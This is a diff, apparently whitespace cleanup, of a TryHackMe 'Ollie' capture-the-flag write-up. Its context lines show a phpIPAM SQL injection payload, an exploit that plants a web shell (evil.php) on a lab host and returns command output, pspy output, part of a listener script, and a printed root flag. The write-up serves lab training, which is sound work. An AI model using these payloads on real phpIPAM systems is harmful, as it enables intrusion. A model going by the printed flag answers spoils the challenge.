@@ -16,7 +16,6 @@ Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for de
 
 **_Rest in Peace 1/5/2023_**
 
-
 **_Please allow up to 3 minutes for the machine to boot._**
 
 Answer the questions below
@@ -190,7 +189,6 @@ What is your name? Ollie
 What's up, Ollie! It's been a while. What are you here for? exploit
 Ya' know what? Ollie. If you can answer a question about me, I might have something for you.
 
-
 What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
 You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
 Please hold on a minute
@@ -322,12 +320,9 @@ exploit(url, auth_cookie, path, command)
 [...] Exploiting
 [+] Success! The shell is located at http://10.10.133.68/evil.php. Parameter: cmd
 
-
 [+] Output:
 1	 uid=33(www-data) gid=33(www-data) groups=33(www-data)
  	3	4
-
-
 
 phpIPAM es una herramienta de administración de direcciones IP (IPAM) de código abierto basada en la web. Permite a los administradores de red gestionar sus direcciones IP y subredes de manera eficiente, lo que resulta muy útil en redes grandes y complejas.
 
@@ -346,7 +341,6 @@ Steps to reproduce
 5.  Click on "Actions" and go to "Subnet Mapping".
 6.  Scroll down to "Map new subnet".
 7.  Insert an SQL Injection sentence inside the search parameter, for example: `" union select @@version,2,user(),4 -- -`.
-
 
 " union select @@version,2,user(),4 -- -
 
@@ -507,7 +501,6 @@ ollie@hackerdog:/tmp$ ./pspy64
 ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
-
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
     ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
@@ -616,8 +609,6 @@ def catch(c, a):
 
     c.close()
 
-
-
 if __name__ == "__main__":
     while True:
         try:
@@ -631,11 +622,7 @@ if __name__ == "__main__":
         except Exception:
             continue
 
-
 ```
-
-
-![[Pasted image 20230224131339.png]]
 
 What is the user.txt flag?
 
@@ -646,6 +633,5 @@ Ollie doesn't give hints!
 What is the root.txt flag?
 
 *THM{Ollie_Luvs_Chicken_Fries}*
-
 
 [[Training for New Analyst]]
